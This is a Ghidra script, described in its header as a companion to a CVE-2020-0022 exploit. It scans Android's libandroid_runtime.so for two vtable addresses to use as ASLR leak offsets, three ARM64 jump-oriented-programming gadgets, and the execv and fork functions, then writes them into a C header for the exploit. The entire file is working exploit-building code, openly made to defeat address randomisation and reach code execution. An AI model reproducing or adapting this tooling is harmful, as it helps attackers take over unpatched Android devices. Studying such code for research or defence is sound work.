// This is a complimentary script to the CVE-2020-0022 exploit. It is used to extract the ASLR leak offsets from the libandroid_runtime.so binary.
// @author @themmokhtar
// @category CVE-2020-0022
// @keybinding 
// @menupath 
// @toolbar 

// import javax.xml.stream.events.Namespace;

import java.util.ArrayList;
import java.util.Dictionary;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.List;
import java.util.Map;

import ghidra.app.script.GhidraScript;
import ghidra.program.model.mem.*;
import ghidra.program.model.lang.*;
import ghidra.program.model.pcode.*;
import ghidra.program.model.util.*;
import ghidra.program.model.reloc.*;
import ghidra.program.model.data.*;
import ghidra.program.model.block.*;
import ghidra.program.model.symbol.*;
import ghidra.program.model.scalar.*;
import ghidra.program.model.listing.*;
import ghidra.program.model.address.*;

public class ProcessLibandroidRuntime extends GhidraScript {

    // Dictionary<String, String[]> gadgets = new Dictionary<String, String[]>();

    public void run() throws Exception {
        Program program = getCurrentProgram();

        SymbolTable symbolTable = program.getSymbolTable();
        Namespace globalNamespace = program.getGlobalNamespace();

        Address baseAddress = program.getImageBase();

        Address firstAslrLeakAddress = findFirstAslrLeakAddress(symbolTable, globalNamespace);
        println("1st ASLR Leak @ " + firstAslrLeakAddress.toString());

        Address secondAslrLeakAddress = findSecondAslrLeakAddress(symbolTable, globalNamespace);
        println("2nd ASLR Leak @ " + secondAslrLeakAddress.toString());

        Address execvFunctionAddress = findFunctionAddress(program, "execv");
        println("Execv Function @ " + execvFunctionAddress.toString());

        Address forkFunctionAddress = findFunctionAddress(program, "fork");
        println("Fork Function @ " + forkFunctionAddress.toString());

        Map<String, Address> jopGadgetsAddresses = findJopGadgetsAddresses(program, new HashMap<String, String[]>() {
            {
                put("DOUBLE_CALL",
                        new String[] {
                                "mov x21,x0;",
                                "cbz x21,0x",
                                "ldr x8,[x21, #0x28];",
                                "mov x0,x21;",
                                "blr x8;",
                                "ldr x8,[x21, #0x30];",
                                "mov x0,x21;",
                                "blr x8;",
                        });
                put("X21_ADDER",
                        new String[] {
                                "ldr x8,[x21, #0x38];",
                                "add x21,x21,#0x10;",
                                "mov x0,x21;",
                                "blr x8;"
                        });
                put("CALLER", new String[] {
                        "mov x19,x0;",
                        "cbz x19,",
                        "ldr x8,[x19];",
                        "ldr x0,[x19, #0x48];",
                        "ldr x1,[x19, #0x10];",
                        "blr x8;"
                });
            }
        });

        // For debugging purposes only
        // for (Map.Entry<String, Address> entry : jopGadgets.entrySet()) {
        // println(entry.getKey() + ": " + entry.getValue().toString());
        // }

        String headerCode = generateHeaderCode(baseAddress, firstAslrLeakAddress, secondAslrLeakAddress,
                jopGadgetsAddresses, execvFunctionAddress, forkFunctionAddress);
        println("Generated header code:");
        println(headerCode);

        java.io.File file = askFile("Select the .h file to save the code to", "Save");
        java.io.PrintWriter writer = new java.io.PrintWriter(file);
        writer.println(headerCode);
        writer.close();
    }

    private Address findFirstAslrLeakAddress(SymbolTable symbolTable, Namespace globalNamespace) throws Exception {
        Namespace classNamespace = symbolTable.getNamespace("DeathRecipientList", globalNamespace);
        if (classNamespace == null)
            throw new Exception("DeathRecipientList namespace not found");
        println(classNamespace.getName());

        Symbol vtableSymbol = findVtableSymbol(symbolTable, classNamespace);
        println(vtableSymbol.getName());

        Address vtableAddress = vtableSymbol.getAddress();
        if (vtableAddress == null)
            throw new Exception("vtable address not found");
        println(vtableAddress.toString());

        return vtableAddress.add(16);
    }

    private Address findSecondAslrLeakAddress(SymbolTable symbolTable, Namespace globalNamespace) throws Exception {
        println(symbolTable.toString());
        println(globalNamespace.getSymbol().getName());

        Namespace androidNamespace = symbolTable.getNamespace("android", globalNamespace);
        if (androidNamespace == null)
            throw new Exception("android namespace not found");
        println(androidNamespace.getName());

        Namespace listClassNamespace = symbolTable.getNamespace("List<android::sp<JavaDeathRecipient>>",
                androidNamespace);
        if (listClassNamespace == null)
            throw new Exception("List<android::sp<JavaDeathRecipient>> namespace not found");
        println(listClassNamespace.getName());

        Symbol vtableSymbol = findVtableSymbol(symbolTable, listClassNamespace);

        Address vtableAddress = vtableSymbol.getAddress();
        if (vtableAddress == null)
            throw new Exception("vtable address not found");
        println(vtableAddress.toString());

        return vtableAddress.add(16);
    }

    private Symbol findVtableSymbol(SymbolTable symbolTable, Namespace classNamespace) throws Exception {
        SymbolIterator vtableIterator = symbolTable.getSymbols(classNamespace);

        Symbol vtableSymbol = null;
        while (vtableIterator.hasNext()) {
            Symbol element = vtableIterator.next();
            if (element.getName().equals("vtable")) {
                vtableSymbol = element;
                break;
            }
        }

        if (vtableSymbol == null)
            throw new Exception("vtable symbol not found");
        println(vtableSymbol.getName());

        return vtableSymbol;
    }

    private Map<String, Address> findJopGadgetsAddresses(Program program,
            Map<String, String[]> gadgetsInstructions) throws Exception {
        Map<String, Address> gadgetsAddresses = new HashMap<>();

        List<String> gadgetsNotYetFound = new ArrayList<>();
        for (String key : gadgetsInstructions.keySet())
            gadgetsNotYetFound.add(key);

        InstructionIterator instrIter = program.getListing().getInstructions(true);
        while (instrIter.hasNext()) {
            Instruction instr = instrIter.next();
            // println(instr.toString());
            // if(instr == null)
            // break;
            String newGadget = null;
            for (String gadgetNotYetFound : gadgetsNotYetFound) {
                String[] gadgetInstructions = gadgetsInstructions.get(gadgetNotYetFound);
                Instruction currentInstr = instr;

                boolean found = true;
                for (String gadgetInstruction : gadgetInstructions) {
                    if (!(currentInstr.toString() + ";").startsWith(gadgetInstruction)) {
                        found = false;
                        break;
                    }

                    currentInstr = currentInstr.getNext();
                }
                if (found)
                    newGadget = gadgetNotYetFound;
            }
            if (newGadget != null) {
                println("FOUND: " + newGadget + " " + instr.getAddress().toString());

                gadgetsAddresses.put(newGadget, instr.getAddress());
                gadgetsNotYetFound.remove(newGadget);

                if (gadgetsNotYetFound.size() == 0)
                    break;
            }

        }

        if (gadgetsNotYetFound.size() > 0)
            throw new Exception("Not all gadgets were found! Missing gadgets: " + gadgetsNotYetFound.toString());

        return gadgetsAddresses;
    }

    private Address findFunctionAddress(Program program, String functionName) throws Exception {
        FunctionManager functionManager = program.getFunctionManager();
        FunctionIterator functionIterator = functionManager.getFunctions(true);
        // FunctionIterator functionIterator = functionManager.getExternalFunctions();

        while (functionIterator.hasNext()) {
            Function function = functionIterator.next();
            if (function.getName().equals(functionName)) {
                return function.getEntryPoint();
                // Address thunkFunctionAddress = function.getFunctionThunkAddresses()[0];
                // println("THUNK: " + function.getFunctionThunkAddresses()[0].toString());

                // for (Reference reference : program.getReferenceManager()
                // .getReferencesTo(function.getFunctionThunkAddresses()[0])) {
                // println("THUNKER: " + reference.toString());
                // }
            }
            // return function.getEntryPoint();
        }

        throw new Exception("execv function not found");
    }

    private String generateHeaderCode(Address baseAddress, Address firstAslrLeakAddress,
            Address secondAslrLeakAddress, Map<String, Address> jopGadgetsAddresses, Address execvFunctionAddress,
            Address forkFunctionAddress) {
        StringBuilder headerCode = new StringBuilder();

        headerCode.append("// This file is autogenerated. Do not modify it!\n\n");
        headerCode.append("#pragma once\n\n");
        headerCode.append("#include <stdint.h>\n\n");
        // headerCode.append("#define LIBANDROID_RUNTIME_BASE_ADDRESS ((uint64_t)(0x"
        // + baseAddress.toString() + "ull))\n");
        headerCode.append("#define LIBANDROID_RUNTIME_FIRST_ASLR_LEAK_OFFSET ((uint64_t)(0x"
                + firstAslrLeakAddress.toString() + "ull))\n");
        headerCode.append("#define LIBANDROID_RUNTIME_SECOND_ASLR_LEAK_OFFSET ((uint64_t)(0x"
                + secondAslrLeakAddress.toString() + "ull))\n");

        headerCode.append("\n");
        for (Map.Entry<String, Address> entry : jopGadgetsAddresses.entrySet()) {
            headerCode.append("#define LIBANDROID_RUNTIME_GADGET_" + entry.getKey() + "_ADDRESS ((uint64_t)(0x"
                    + entry.getValue().toString() + "ull))\n");
        }

        headerCode.append("\n");
        headerCode.append("#define LIBANDROID_RUNTIME_EXECV_ADDRESS ((uint64_t)(0x" + execvFunctionAddress.toString()
                + "ull))\n");
        headerCode.append("#define LIBANDROID_RUNTIME_FORK_ADDRESS ((uint64_t)(0x" + forkFunctionAddress.toString()
                + "ull))\n");

        return headerCode.toString();
    }
}
